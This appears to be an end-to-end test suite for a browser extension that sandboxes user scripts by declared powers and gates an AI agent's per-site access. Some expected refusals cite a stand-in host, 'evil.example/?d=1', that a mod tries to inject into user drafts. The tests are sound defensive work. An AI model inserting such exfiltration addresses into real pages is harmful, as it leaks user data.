      await waitFor('allowed, registered with its powers', async () => /e2e-pw-all\s+registered \(boxed, powers: read-drafts, sound, controls\)/.test(await status()) || null, { timeoutMs: 20000, intervalMs: 500 });
      await this.cli(['reload', '--tab', String(win.tabId)], { timeoutMs: 30000 });
      let last = null;
      const got = await waitFor('the powers\' results', async () => { const o = last = await read(); return o.all && o.none && !/pending/.test(o.all) ? o : null; }, { timeoutMs: 15000, intervalMs: 400 })
        .catch((e) => { throw new Error(`${e.message}: ${JSON.stringify(last)}`); });
      const A = JSON.parse(got.all), N = JSON.parse(got.none);
      for (const [k, v] of Object.entries(N)) if (!/^(refused|absent)/.test(v)) problems.push(`UNDECLARED ${k}: ${v}`);
      for (const [k, v] of Object.entries(A)) {
        const want = /\(refused\)$/.test(k) ? /^refused/ : /^ok/;
        if (!want.test(v)) problems.push(`DECLARED ${k}: ${v}`);
      }
      const exact = { 'controls: a slider': 'ok: 7', 'controls: its type': 'ok: text/off', 'controls: a select': 'ok: b', 'controls: a checkbox': 'ok: true', 'read-drafts: a field\'s value': 'ok: v', 'sound: a data: sound': 'ok: true' };
      for (const [k, v] of Object.entries(exact)) if (A[k] !== v) problems.push(`${k}: ${A[k]}`);
      if (!/secret draft/.test(A['read-drafts: an editor\'s text'] || '')) problems.push(`the editor's text: ${A['read-drafts: an editor\'s text']}`);
      if (got.formInputs !== 2) problems.push(`the page's form has ${got.formInputs} inputs (a mod's control got in)`);
      await typeKeys();
      const k1 = (await read()).keys || '';
      // (read-drafts: keys in a field, not a password; without keys, none on what could hide a field)
      if (!/^null@pw,k@fi,null@shost,q@/.test(k1)) problems.push(`keys with read-drafts: ${k1}`);
      // a new version, the same powers: runs without asking
      fs.writeFileSync(allFile, all + '\n// a new version, the same powers\n');
      await waitFor('the new version running', async () => { const st = await status(); return /e2e-pw-all\s+registered \(boxed, powers/.test(st) && !/e2e-pw-all\s+(HELD|CHANGE WAITING)/.test(st) ? st : null; }, { timeoutMs: 20000, intervalMs: 500 });
      // a new power (keys): waits for that one only
      fs.writeFileSync(allFile, all.replace('// @powers      sound, controls, read-drafts', '// @powers      sound, controls, read-drafts, keys'));
      const held2 = await waitFor('held for the new power', async () => { const st = await status(); return /e2e-pw-all\s+CHANGE WAITING/.test(st) ? st : null; }, { timeoutMs: 20000, intervalMs: 500 });
      if (!/CHANGE WAITING \(the version before runs meanwhile\): it can see the keys you press \(not in text fields\), so it can have shortcuts; Mods with many powers can act in unspecific or powerful ways\. Treat this with caution\. \(trif approve/.test(line(held2, 'e2e-pw-all'))) problems.push(`trif status for the new power: ${line(held2, 'e2e-pw-all')}`);
      await this.cli(['approve', '127.0.0.1/e2e-pw-all'], { timeoutMs: 20000 });
      await waitFor('keys allowed', async () => /e2e-pw-all\s+registered \(boxed, powers: read-drafts, keys, sound, controls\)/.test(await status()) || null, { timeoutMs: 20000, intervalMs: 500 });
      await this.cli(['reload', '--tab', String(win.tabId)], { timeoutMs: 30000 });
      await waitFor('reloaded', async () => { const o = await read(); return o.all && !/pending/.test(o.all) ? o : null; }, { timeoutMs: 15000, intervalMs: 400 });
      await typeKeys();
      const k2 = (await read()).keys || '';
      // (keys: shown outside fields, the closed shadow root's host too: the risk the power accepts)
      if (!/^null@pw,k@fi,x@shost,q@/.test(k2)) problems.push(`keys with keys: ${k2}`);
      const leaks = this.o.servers.requests.filter((q) => q.url.includes('e2e-pw-leak')).map((q) => q.url);
      if (leaks.length) problems.push(`the server saw: ${leaks.join(', ')}`);
      fs.writeFileSync(this.r.file(`powers-${this.o.browser}.json`), JSON.stringify({ declared: A, undeclared: N, keys: [k1, k2], typed: got.typed, problems }, null, 2));
      if (problems.length) throw new Error(problems.join('\n'));
      return `held for "${row.items.join(' ')}" and "${row.together.join(' ')}"; the approval dialog opened by itself, kept the focus, closed on Esc and stayed closed, the badge reopened it; allowed there; ${Object.keys(A).length} declared outcomes as expected (sound, controls, read-drafts), ${Object.keys(N).length} undeclared refused; keys ${k1} then, with keys, ${k2}; same powers ran, a new one waited`;
    } finally {
      for (const f of [allFile, noneFile]) { try { fs.unlinkSync(f); } catch { /* gone */ } }
    }
  }

  async powers2Check(win) {
    const site = '127.0.0.1';
    const base = `http://${site}:${this.o.servers.port}`;
    const dir = path.join(this.trif, 'sites', site);
    const fx = (f) => fs.readFileSync(path.join(I.REPO, 'tests', 'e2e', 'fixtures', f), 'utf8');
    const file = path.join(dir, 'e2e-pw2.js'), noneFile = path.join(dir, 'e2e-pw-none.js');
    const status = async () => (await this.cli(['status'], { timeoutMs: 20000 })).stdout;
    const line = (st, id) => st.split('\n').find((l) => l.includes(id)) || '';
    const problems = [];
    this.sandboxPage = true;
    try {
      fs.writeFileSync(file, fx('powers-2.js').replace('__SEARCH__', `${base}/e2e-search?q={query}`));
      fs.writeFileSync(noneFile, fx('powers-none.js'));
      const held = await waitFor('held for its powers', async () => { const st = await status(); return /e2e-pw2\s+HELD/.test(st) ? st : null; }, { timeoutMs: 25000, intervalMs: 500 });
      const want = `HELD: it can see and filter what ${site} sends this page (posts, profiles), but can't send anything; it can read the data ${site} keeps behind what's on the page; it adds a search box that searches ${site}`;
      if (!line(held, 'e2e-pw2').includes(want)) problems.push(`trif status: ${line(held, 'e2e-pw2')}`);
      await this.cli(['approve', `${site}/e2e-pw2`], { timeoutMs: 20000 });
      await waitFor('registered', async () => /e2e-pw2\s+registered \(boxed, powers: site-data, page-data, search-box\)/.test(await status()) || null, { timeoutMs: 20000, intervalMs: 500 });
      await this.ext(`async (id, url) => { await chrome.tabs.update(id, { url, active: true }); }`, [win.tabId, `${base}/sandbox.html`]);
      const read = async () => JSON.parse((await this.cli(['run', '--tab', String(win.tabId), `({ r: document.documentElement.getAttribute('data-trif-box-pw2'), none2: document.documentElement.getAttribute('data-trif-box-pw-none2') })`], { timeoutMs: 20000 })).stdout);
      const got = await waitFor('the mod\'s results', async () => { const o = await read(); return o.r && /search-box: its children/.test(o.r) && o.none2 ? o : null; }, { timeoutMs: 15000, intervalMs: 400 });
      const R = JSON.parse(got.r), N = JSON.parse(got.none2);
      for (const [k, v] of Object.entries(N)) if (!/^(refused|absent)/.test(v)) problems.push(`UNDECLARED ${k}: ${v}`);
      const exact = {
        'page-data: props': 'ok: {"text":"from react","likes":3}',
        'page-data: a parent\'s props': 'ok: {"name":"tim","handlers":{}}',
        'search-box: what\'s inside it': 'ok: null', 'search-box: its text': 'ok: ""', 'search-box: its children': 'ok: 0',
      };
      for (const [k, v] of Object.entries(exact)) if (R[k] !== v) problems.push(`${k}: ${R[k]}`);
      for (const k of ['page-data: a bad path (refused)', 'search-box: its value (refused)']) if (!/^refused/.test(R[k] || '')) problems.push(`${k}: ${R[k]}`);
      // site-data, through the page's own fetch and XHR
      const data = JSON.parse((await this.cli(['run', '--tab', String(win.tabId), `(async () => {
        const j = async (p) => (await fetch(p)).json();
        const x = (p, type) => new Promise((res) => { const r = new XMLHttpRequest(); r.open('GET', p); if (type) r.responseType = type; r.onload = () => res(type === 'json' ? r.response : JSON.parse(r.responseText)); r.send(); });
        const ids = (d) => d.items.map((i) => i.id).join(',');
        const o = {};
        for (const n of ['feed', 'order', 'invent', 'number', 'key', 'twice', 'truncate', 'other']) { const d = await j('/e2e-api/' + n + '.json'); o[n] = [ids(d), d.count, d.cursor, 'media_url' in d]; }
        o.feedXhr = ids(await x('/e2e-api/feed.json?xhr'));
        o.feedXhrJson = ids(await x('/e2e-api/feed.json?json', 'json'));
        return o;
      })()`], { timeoutMs: 30000 })).stdout);
      const as = (name, v) => { if (JSON.stringify(data[name]) !== JSON.stringify(v)) problems.push(`site-data ${name}: ${JSON.stringify(data[name])}`); };
      const kept = ['1,2,3', 3, 'c-next', false];
      as('feed', ['1,3', 3, 'c-next', false]); as('order', ['3,2,1', 3, 'c-next', false]);
      for (const n of ['invent', 'number', 'key', 'twice', 'truncate', 'other']) as(n, kept);
      as('feedXhr', '1,3'); as('feedXhrJson', '1,3');
      const errs = JSON.stringify((await this.cli(['errors', '--tab', String(win.tabId)], { json: true, timeoutMs: 20000 })).json || []);
      if (!/the text \\"(9|invented|http:\/\/localhost:1\/e2e-pw-leak)\\" isn't in what the site sent/.test(errs)) problems.push('trif errors doesn\'t say the invented text isn\'t in what the site sent');
      for (const why of ['the value 424242 isn\'t in what the site sent', 'the key \\"media_url\\" isn\'t in what the site sent', 'more times than what the site sent', 'the text \\"c-n\\" isn\'t in']) {
        if (!errs.includes(why)) problems.push(`trif errors doesn't say: ${why}`);
      }
      // search-box: the user's typing, and Enter, go to the site's search
      const ctx = await this.d.findPage((u) => u.includes('/sandbox.html'), { timeoutMs: 5000 });
      await this.d.click(ctx, '#trif-box-pw-search');
      for (const k of ['c', 'a', 't', 'Enter']) await this.d.key(ctx, k);
      await waitFor('the search page', async () => this.o.servers.requests.some((q) => q.url === '/e2e-search?q=cat') || null, { timeoutMs: 10000, intervalMs: 300 })
        .catch(() => problems.push('the search box didn\'t go to /e2e-search?q=cat'));
      const leaks = this.o.servers.requests.filter((q) => q.url.includes('e2e-pw-leak')).map((q) => q.url);
      if (leaks.length) problems.push(`the server saw: ${leaks.join(', ')}`);
      fs.writeFileSync(this.r.file(`powers2-${this.o.browser}.json`), JSON.stringify({ R, N, data, problems }, null, 2));
      if (problems.length) throw new Error(problems.join('\n'));
      return `held for site-data, page-data, search-box (sentences as drafted); fetch and XHR filtered (removed: ${data.feed[0]}, reordered: ${data.order[0]}), 5 inventions refused and the originals kept; page-data copies without functions or nodes; the search box unreadable, and Enter went to /e2e-search?q=cat; ${Object.keys(N).length} undeclared refused`;
    } finally {
      for (const f of [file, noneFile]) { try { fs.unlinkSync(f); } catch { /* gone */ } }
      await this.ext(`async (id, url) => { await chrome.tabs.update(id, { url }); }`, [win.tabId, `${base}/?e2e=after-powers2`]).catch(() => {});
    }
  }

  async powers3Check(win) {
    const site = '127.0.0.1';
    const base = `http://${site}:${this.o.servers.port}`;
    const dir = path.join(this.trif, 'sites', site);
    const fx = (f) => fs.readFileSync(path.join(I.REPO, 'tests', 'e2e', 'fixtures', f), 'utf8');
    const files = { 'e2e-pw3': fx('powers-3.js'), 'e2e-pw3b': fx('powers-3b.js'), 'e2e-pw3none': fx('powers-3none.js') };
    const kFile = path.join(dir, 'e2e-pw3k.js');
    const status = async () => (await this.cli(['status'], { timeoutMs: 20000 })).stdout;
    const line = (st, id) => st.split('\n').find((l) => new RegExp(`${id}\\s`).test(l)) || '';
    const read = async () => JSON.parse((await this.cli(['run', '--tab', String(win.tabId), `(() => { const d = document.documentElement; return {
      r: d.getAttribute('data-trif-box-pw3'), b: d.getAttribute('data-trif-box-pw3b'), bClick: d.getAttribute('data-trif-box-pw3b-click'), none: d.getAttribute('data-trif-box-pw3none'),
      seen: document.getElementById('seen') && document.getElementById('seen').textContent, hash: location.hash, wd: document.getElementById('wd') && document.getElementById('wd').value,
      pw: document.getElementById('pw3') && document.getElementById('pw3').value, ed: document.getElementById('ed2') && document.getElementById('ed2').textContent,
      f3i: document.getElementById('f3i') && document.getElementById('f3i').value, path: location.pathname }; })()`], { timeoutMs: 20000 })).stdout);
    const open = async () => {
      await this.ext(`async (id, url) => { await chrome.tabs.update(id, { url, active: true }); }`, [win.tabId, `${base}/powers3.html`]);
      let last = null;
      return waitFor('the mods\' results', async () => { const o = last = await read(); return o.r && /"done"/.test(o.r) && o.none && o.bClick && /mods: an answer/.test(o.r) ? o : null; }, { timeoutMs: 20000, intervalMs: 400 })
        .catch((e) => { throw new Error(`${e.message}: ${JSON.stringify(last)}`); });
    };
    const problems = [];
    this.sandboxPage = true;
    try {
      for (const [id, text] of Object.entries(files)) fs.writeFileSync(path.join(dir, `${id}.js`), text);
      // held, for its powers and the combination; mods alone (e2e-pw3b) doesn't hold
      const held = await waitFor('held for its powers', async () => { const st = await status(); return /e2e-pw3\s+HELD/.test(st) && /e2e-pw3b\s+HELD: it can talk to your other boxed mods on this page; it can click these for you: the counter \(#pclick\) \(trif approve/.test(st) && /e2e-pw3none\s+registered \(boxed\)/.test(st) ? st : null; }, { timeoutMs: 25000, intervalMs: 500 });
      const hl = line(held, 'e2e-pw3');
      for (const want of ['it can read what you type on this site, but can\'t send it anywhere', 'it can talk to your other boxed mods on this page', 'it can play and pause video and audio on this page',
        `it can take you to these pages on ${site}: /e2e-goto-ok, or to a link the page shows`,
        'it can click these for you: the counter (#pclick), a link on this page (#plink), the form\'s buttons (#fb3, #fr3, #lb3), a link to another site (#ext3)',
        'it can change what you type and paste on this site before you post it', 'Mods with many powers can act in unspecific or powerful ways. Treat this with caution.']) {
        if (!hl.includes(want)) problems.push(`trif status doesn't say "${want}": ${hl}`);
      }
      await this.cli(['approve', `${site}/e2e-pw3`], { timeoutMs: 20000 });
      await this.cli(['approve', `${site}/e2e-pw3b`], { timeoutMs: 20000 });
      await waitFor('registered', async () => { const st = await status(); return /e2e-pw3\s+registered \(boxed, powers: read-drafts, mods, media, go-to, click, write-drafts\)/.test(st) && /e2e-pw3b\s+registered \(boxed, powers: mods, click\)/.test(st) || null; }, { timeoutMs: 20000, intervalMs: 500 });
      const got = await open();
      const R = JSON.parse(got.r), N = JSON.parse(got.none);
      for (const [k, v] of Object.entries(N)) if (!/^(refused|absent)/.test(v)) problems.push(`UNDECLARED ${k}: ${v}`);
      for (const [k, v] of Object.entries(R)) if (!(/\(refused\)$/.test(k) ? /^refused/ : /^ok/).test(v)) problems.push(`DECLARED ${k}: ${v}`);
      const exact = {
        'media: mute': 'ok: true', 'media: volume': 'ok: 0.5', 'media: seek': 'ok: 0', 'media: pause': 'ok: true', 'media: play': 'ok: object',
        'click: the counter': 'ok: 1', 'write-drafts: a field': 'ok: rewritten', 'write-drafts: a textarea': 'ok: rewritten two, see example.org/a', 'write-drafts: back to plain words': 'ok: rewritten', 'write-drafts: an editor': 'ok: rewritten draft',
        'mods: an answer': `ok: {"echo":{"hello":"from a","n":1},"by":"b"} from ${site}/e2e-pw3b`,
      };
      for (const [k, v] of Object.entries(exact)) if (R[k] !== v) problems.push(`${k}: ${R[k]}`);
      const why = {
        'click: a submit button (refused)': /would submit/, 'click: a reset button (refused)': /would submit/, 'click: a label for a submit button (refused)': /would submit/,
        'click: a link to another site (refused)': /link to another site/, 'click: a button the header doesn\'t name (refused)': /isn't one of the things the header says/,
        'go-to: a page the header doesn\'t name (refused)': /isn't one of the header's pages/, 'go-to: a link to another site the page shows (refused)': /isn't one of the header's pages/,
        'write-drafts: a password (refused)': /password and card fields stay the user's/, 'write-drafts: a card field (refused)': /password and card fields stay the user's/,
        'mods: a function in a message (refused)': /plain data/, 'mods: an element in a message (refused)': /plain data/,
        'write-drafts: an address the user didn\'t type (refused)': /"https:\/\/evil\.example\/\?d=1" looks like an address that isn't in what the user typed here or in a link on the page/,
        'write-drafts: an address the user typed, with more on it (refused)': /"example\.org\/a\?d=1" looks like an address/,
        'write-drafts: an address into an editor (refused)': /"evil\.example" looks like an address/,
        'write-drafts: a word and a dot that make an address (refused)': /"evil\.example" looks like an address/,
      };
      for (const [k, re] of Object.entries(why)) if (!re.test(R[k] || '')) problems.push(`${k}: ${R[k]}`);
      if (got.b !== `{"hello":"from a","n":1} from ${site}/e2e-pw3`) problems.push(`the other end of the channel: ${got.b}`);
      if (!/^refused: .*clicking for the user is off on this page while another boxed mod here has the read-drafts power/.test(got.bClick || '')) problems.push(`the other mod's click, beside a read it didn't ask for: ${got.bClick}`);
      if (got.hash !== '#plink-target') problems.push(`the link on the page wasn't clicked: ${got.hash}`);
      if (!/^wd,wta/.test(got.seen || '')) problems.push(`the page didn't see the changed drafts as input: ${got.seen}`);
      if (got.pw !== 'hunter2' || got.f3i !== 'typed') problems.push(`a field changed that shouldn't: ${JSON.stringify(got)}`);
      // go-to: the header's page, from the mod's own button
      const ctx = await this.d.findPage((u) => u.includes('/powers3.html'), { timeoutMs: 5000 });
      await this.d.click(ctx, '#trif-box-pw3-go');
      await waitFor('the go-to page', async () => this.o.servers.requests.some((q) => q.url === '/e2e-goto-ok') || null, { timeoutMs: 10000, intervalMs: 300 })
        .catch(() => problems.push('go-to didn\'t go to /e2e-goto-ok'));
      // another boxed mod with a read (keys) the writer didn't ask for: write-drafts is off on the page
      fs.writeFileSync(kFile, `// ==WebMod==\n// @name E2E keys\n// @match *://127.0.0.1/powers3.html*\n// @boxed\n// @powers keys\n// @run-at document-start\n// ==/WebMod==\npage.on('keydown', () => {});\n`);
      await waitFor('the keys mod held', async () => /e2e-pw3k\s+HELD/.test(await status()) || null, { timeoutMs: 20000, intervalMs: 500 });
      await this.cli(['approve', `${site}/e2e-pw3k`], { timeoutMs: 20000 });
      await waitFor('the keys mod registered', async () => /e2e-pw3k\s+registered \(boxed, powers: keys\)/.test(await status()) || null, { timeoutMs: 20000, intervalMs: 500 });
      const got2 = await open();
      const R2 = JSON.parse(got2.r);
      for (const k of ['write-drafts: a field', 'write-drafts: a textarea', 'write-drafts: an editor']) {
        if (!/^refused: .*off on this page while another boxed mod here has the keys power/.test(R2[k] || '')) problems.push(`with a keys mod on the page, ${k}: ${R2[k]}`);
      }
      if (got2.wd !== 'the user\'s draft' || got2.ed !== 'the user\'s editor draft') problems.push(`with a keys mod on the page, the drafts changed: ${got2.wd} / ${got2.ed}`);
      const reqs = this.o.servers.requests.map((q) => q.url);
      const bad = reqs.filter((u) => u.includes('e2e-pw-leak') || u.startsWith('/e2e-goto-not-named') || u.startsWith('/e2e-goto-ok?') || u.startsWith('/e2e-goto-shown'));
      if (bad.length) problems.push(`the server saw: ${bad.join(', ')}`);
      fs.writeFileSync(this.r.file(`powers3-${this.o.browser}.json`), JSON.stringify({ R, N, R2, got, got2, problems }, null, 2));
      if (problems.length) throw new Error(problems.join('\n'));
      return `held for media, go-to, click, write-drafts, read-drafts and mods, with the combination; ${Object.keys(R).length} declared outcomes as expected (${Object.keys(why).length} refusals with their reasons); a channel answered; go-to went to /e2e-goto-ok; with a keys mod on the page, write-drafts refused; ${Object.keys(N).length} undeclared refused`;
    } finally {
      for (const id of [...Object.keys(files), 'e2e-pw3k']) { try { fs.unlinkSync(path.join(dir, `${id}.js`)); } catch { /* gone */ } }
      await this.ext(`async (id, url) => { await chrome.tabs.update(id, { url }); }`, [win.tabId, `${base}/?e2e=after-powers3`]).catch(() => {});
    }
  }

  // "Agent on this site": the Ask dialog (Just this once runs the code), the header's control at Look and
  // Off (trif run, then trif text, refused with the level), a site on the sensitive list (off, with its line),
  // and Settings' list. Screenshots in both themes (Chrome).
  async agentSitesCheck(win) {
    const site = '127.0.0.1';
    const base = `http://${site}:${this.o.servers.port}`;
    const setStore = (v) => this.ext(`async (v) => { await chrome.storage.local.set(v); }`, [v]);
    const panelState = () => this.panel(`async () => ({ level: document.getElementById('agent-level').value, shown: !document.getElementById('agent-level').hidden,
      note: document.getElementById('agent-note').hidden ? '' : document.getElementById('agent-note').textContent,
      ask: document.getElementById('agent-ask')?.open ? document.getElementById('agent-ask-title').textContent : null })`);
    const themes = async (name) => { for (const scheme of ['dark', 'light']) if (await this.d.colorScheme(this.panelCtx, scheme)) { await sleep(150); await this.shot(this.panelCtx, `${name}-${scheme}`); } await this.d.colorScheme(this.panelCtx, ''); };
    const problems = [];
    try {
      await this.ext(`async (id, url) => { await chrome.tabs.update(id, { url, active: true }); }`, [win.tabId, `${base}/`]);
      await this.dismissApproval();
      // Ask: no choice for the site yet
      const { [site]: _, ...rest } = AGENT_SITES;
      await setStore({ agentSites: rest });
      await waitFor('the header at Ask', async () => { const p = await panelState(); return p.shown && p.level === 'ask' ? p : null; }, { timeoutMs: 10000 });
      const running = this.cli(['run', '--tab', String(win.tabId), '6 * 7'], { timeoutMs: 60000 });
      const asked = await waitFor('the Ask dialog', async () => { const p = await panelState(); return p.ask ? p : null; }, { timeoutMs: 15000 });
      if (asked.ask !== `Your agent wants to run code on ${site}.`) problems.push(`the Ask dialog: ${asked.ask}`);
      await themes('agent-ask');
      await this.d.click(this.panelCtx, '#agent-ask .agent-once');
      const ran = await running;
      if (ran.status !== 0 || !/42/.test(ran.stdout)) problems.push(`Just this once: the code didn't run: ${ran.stdout} ${ran.stderr}`);
      // (once: the site is still Ask afterwards)
      if ((await panelState()).level !== 'ask') problems.push('Just this once changed the site\'s level');
      // Look, from the header's control: trif run refused with the level; trif text works
      await this.panel(`async () => { const s = document.getElementById('agent-level'); s.value = 'look'; s.dispatchEvent(new Event('change')); return true; }`);
      await waitFor('Look saved', async () => (await this.ext(`async () => (await chrome.storage.local.get('agentSites')).agentSites`))?.[site] === 'look' || null, { timeoutMs: 8000 });
      await themes('agent-header-look');
      const look = await this.cli(['run', '--tab', String(win.tabId), '1']);
      if (look.status === 0 || !/"Agent on this site" to Look for 127\.0\.0\.1/.test(look.stderr + look.stdout)) problems.push(`trif run at Look: ${look.status} ${look.stderr}`);
      const read = await this.cli(['text', '--tab', String(win.tabId)]);
      if (read.status !== 0) problems.push(`trif text at Look: ${read.stderr}`);
      // Off: trif text refused too
      await this.panel(`async () => { const s = document.getElementById('agent-level'); s.value = 'off'; s.dispatchEvent(new Event('change')); return true; }`);
      await waitFor('Off saved', async () => (await this.ext(`async () => (await chrome.storage.local.get('agentSites')).agentSites`))?.[site] === 'off' || null, { timeoutMs: 8000 });
      const off = await this.cli(['text', '--tab', String(win.tabId)]);
      if (off.status === 0 || !/"Agent on this site" is Off for 127\.0\.0\.1/.test(off.stderr + off.stdout)) problems.push(`trif text at Off: ${off.status} ${off.stderr}`);
      // the sensitive list: off by default, with its line under the bar
      await setStore({ agentSites: rest, sensitiveSites: [{ pattern: site, why: 'a test site' }] });
      const sens = await waitFor('the line for a sensitive site', async () => { const p = await panelState(); return p.note ? p : null; }, { timeoutMs: 8000 });
      if (sens.level !== 'off' || sens.note !== `Your agent is off on ${site}: it's a test site. Choose “Agent” above to let it look or run code here.`) problems.push(`a sensitive site: ${JSON.stringify(sens)}`);
      await themes('agent-header-sensitive');
      // Settings: the sites chosen, and the sensitive list
      await setStore({ agentSites: { ...rest, [site]: 'look' }, sensitiveSites: null });
      await this.panelClick('#settings-btn');
      const settings = await waitFor('Settings\' list', () => this.panel(`async () => {
        const li = document.querySelector('#agent-sites-list li[data-site="${site}"]');
        if (!li) return null;
        li.scrollIntoView({ block: 'center' });
        return { level: li.querySelector('select').value, sensitive: document.getElementById('sensitive-sites').value.split(String.fromCharCode(10)).length };
      }`), { timeoutMs: 8000 });
      if (settings.level !== 'look' || settings.sensitive < 30) problems.push(`Settings: ${JSON.stringify(settings)}`);
      await themes('agent-settings');
      if (problems.length) throw new Error(problems.join('\n'));
      return `Ask: the dialog ("${asked.ask}"), Just this once ran the code (42) and left the site at Ask; Look from the header refused trif run and allowed trif text; Off refused trif text; a sensitive site off with its line; Settings listed the choice and ${settings.sensitive} sensitive patterns`;
    } finally {
      await setStore({ agentSites: AGENT_SITES, sensitiveSites: null }).catch(() => {});
      await this.d.colorScheme(this.panelCtx, '').catch(() => {});
      // (Settings closed again, if this opened it)
      if (await this.panel(`async () => !document.getElementById('settings').hidden`).catch(() => false)) await this.panelClick('#settings-btn').catch(() => {});
    }
  }

  async codeViewCheck(win) {
    const site = '127.0.0.1';
    const base = `http://${site}:${this.o.servers.port}`;
    const dir = path.join(this.trif, 'sites', site);
    const styleFile = path.join(dir, 'e2e-cv-style.js');
    const styleText = '// ==WebMod==\n// @name E2E code card rules\n// @match *://127.0.0.1/*\n// @style\n// ==/WebMod==\n{ "css": "#title { letter-spacing: 0.01em }" }\n';
    const themes = async (name) => { for (const scheme of ['dark', 'light']) if (await this.d.colorScheme(this.panelCtx, scheme)) { await sleep(150); await this.shot(this.panelCtx, `${name}-${scheme}`); } await this.d.colorScheme(this.panelCtx, ''); };
    const card = () => this.panel(`async () => {
      const d = document.getElementById('code-view');
      if (!d || !d.open) return null;
      const lines = [...d.querySelectorAll('.cv-code .l')];
      return { mod: d.dataset.mod, name: d.querySelector('.ap-name').textContent, chip: d.querySelector('.ap-chip').textContent, where: d.querySelector('.ap-where').textContent,
        code: lines.map((l) => l.textContent).join(String.fromCharCode(10)), lines: lines.length, coloured: d.querySelectorAll('.cv-code .tk, .cv-code .ts, .cv-code .tc').length,
        copied: d.querySelector('.cv-copy').dataset.copied || '', reveal: d.querySelector('.cv-reveal').textContent, err: d.querySelector('.ap-err').hidden ? '' : d.querySelector('.ap-err').textContent };
    }`);
    const problems = [];
    const revealed = () => { try { return fs.readFileSync(this.revealStub().log, 'utf8').trim().split('\n').filter(Boolean); } catch { return []; } };
    try {
      fs.writeFileSync(styleFile, styleText);
      await waitFor('the style mod registered', async () => /e2e-cv-style\s+registered/.test((await this.cli(['status'], { timeoutMs: 20000 })).stdout) || null, { timeoutMs: 20000, intervalMs: 500 });
      await this.ext(`async (id, url) => { await chrome.tabs.update(id, { url, active: true }); }`, [win.tabId, `${base}/`]);
      await this.dismissApproval();
      await waitFor('the rows', () => this.panel(`async () => !!document.querySelector('li[data-mod="${site}/e2e-banner"] .mod-code') && !!document.querySelector('li[data-mod="${site}/e2e-cv-style"] .mod-code') || null`), { timeoutMs: 15000 });
      await themes('code-row');
      // a free mod, from its </>
      await this.panelClick(`li[data-mod="${site}/e2e-banner"] .mod-code`);
      const free = await waitFor('the code card', async () => { const c = await card(); return c && c.lines ? c : null; }, { timeoutMs: 8000 });
      const want = fs.readFileSync(path.join(dir, 'e2e-banner.js'), 'utf8');
      if (free.mod !== `${site}/e2e-banner` || free.chip !== 'Free mod' || free.where !== `${site} · e2e-banner.js` || free.code !== want || free.lines !== want.split('\n').length) problems.push(`the free mod's card: ${JSON.stringify({ ...free, code: free.code.slice(0, 200) })}`);
      if (!free.coloured) problems.push('no colouring in the code');
      await themes('code-card');
      // Copy
      await this.d.click(this.panelCtx, '#code-view .cv-copy');
      const copied = await waitFor('Copy', async () => { const c = await card(); return c && c.copied ? c.copied : null; }, { timeoutMs: 5000 }).catch(() => 'no answer');
      if (copied !== 'true') problems.push(`Copy: ${copied}`);
      // Show in Finder, the file name in the card (the same), Open in editor: only with the stand-in for open in place
      const helperLog = fs.readFileSync(path.join(this.priv, 'helper.log'), 'utf8');
      if (!/reveal: TRIF_REVEAL_CMD stands in for open/.test(helperLog)) problems.push('the helper doesn\'t say open is stood in for: Show in Finder not clicked');
      else {
        await this.d.click(this.panelCtx, '#code-view .cv-reveal');
        await this.d.click(this.panelCtx, '#code-view .cv-file');
        await this.d.click(this.panelCtx, '#code-view .cv-editor');
        const got = await waitFor('the helper to reveal it', () => (revealed().length >= 3 ? revealed() : null), { timeoutMs: 8000 }).catch(() => revealed());
        const file = path.join('sites', site, 'e2e-banner.js');
        const mac = process.platform === 'darwin';
        const ok = got.length === 3 && got.every((l) => l.endsWith(mac ? file : path.dirname(file)) || l.endsWith(file))
          && (mac ? /^open -R /.test(got[0]) && /^open -R /.test(got[1]) && /^open \//.test(got[2]) : got.every((l) => /^xdg-open /.test(l)));
        if (!ok) problems.push(`what the helper ran: ${JSON.stringify(got)}`);
        if (free.reveal !== (mac ? 'Show in Finder' : 'Show in folder')) problems.push(`the button: ${free.reveal}`);
      }
      await this.d.key(this.panelCtx, 'Escape');
      if (await card()) problems.push('Esc didn\'t close the code card');
      // a style mod, from its file name on the row: its rules, as in the file
      await this.panelClick(`li[data-mod="${site}/e2e-cv-style"] button.mod-file`);
      const style = await waitFor('the style mod\'s card', async () => { const c = await card(); return c && c.lines ? c : null; }, { timeoutMs: 8000 });
      if (style.chip !== 'Style mod' || style.code !== styleText) problems.push(`the style mod's card: ${JSON.stringify(style)}`);
      await this.d.key(this.panelCtx, 'Escape');
      if (problems.length) throw new Error(problems.join('\n'));
      return `the free mod's code (${free.lines} lines, coloured) from its </>, Copy copied, Show in Finder / the file name / Open in editor ran ${revealed().join(' | ')}; the style mod's rules from its file name; Esc closed it`;
    } finally {
      try { fs.unlinkSync(styleFile); } catch { /* gone */ }
      await this.panel(`async () => { const d = document.getElementById('code-view'); if (d && d.open) d.close(); return true; }`).catch(() => {});
    }
  }

  async specRulesCheck(win) {
    const site = '127.0.0.1';
    const base = `http://${site}:${this.o.servers.port}`;
    const dir = path.join(this.trif, 'sites', site);
    const head = (name, boxed) => `// ==WebMod==\n// @name ${name}\n// @match *://127.0.0.1/specrules.html*\n${boxed ? '// @sandboxed\n' : ''}// @run-at document-idle\n// ==/WebMod==\n`;
    const files = {
      'e2e-spec-free': head('E2E spec, free') + `const a = document.createElement('a'); a.href = '/e2e-spec-free/carried-data'; a.textContent = 'free'; document.body.append(a); document.documentElement.setAttribute('data-spec-free', 'made');\n`,
      'e2e-spec-boxed': head('E2E spec, boxed', true) + `let r; try { const a = page.create('a'); a.setAttr('href', '/e2e-spec-boxed/carried-data'); a.setText('boxed'); page.body.append(a); r = 'made'; } catch (e) { r = 'refused: ' + e.message; }
try { const b = page.create('a'); b.setAttr('href', '/two.html'); b.setText('a copy of a page link'); page.body.append(b); r += ' | copy made'; } catch (e) { r += ' | copy refused: ' + e.message; }
page.root.setAttr('data-trif-box-spec', r);\n`,
    };
    this.sandboxPage = true;
    try {
      for (const [id, text] of Object.entries(files)) fs.writeFileSync(path.join(dir, `${id}.js`), text);
      await waitFor('both registered', async () => { const st = (await this.cli(['status'], { timeoutMs: 20000 })).stdout; return /e2e-spec-free\s+registered/.test(st) && /e2e-spec-boxed\s+registered/.test(st) ? true : null; }, { timeoutMs: 20000, intervalMs: 500 });
      const n0 = this.o.servers.requests.length;
      await this.ext(`async (id, url) => { await chrome.tabs.update(id, { url, active: true }); }`, [win.tabId, `${base}/specrules.html`]);
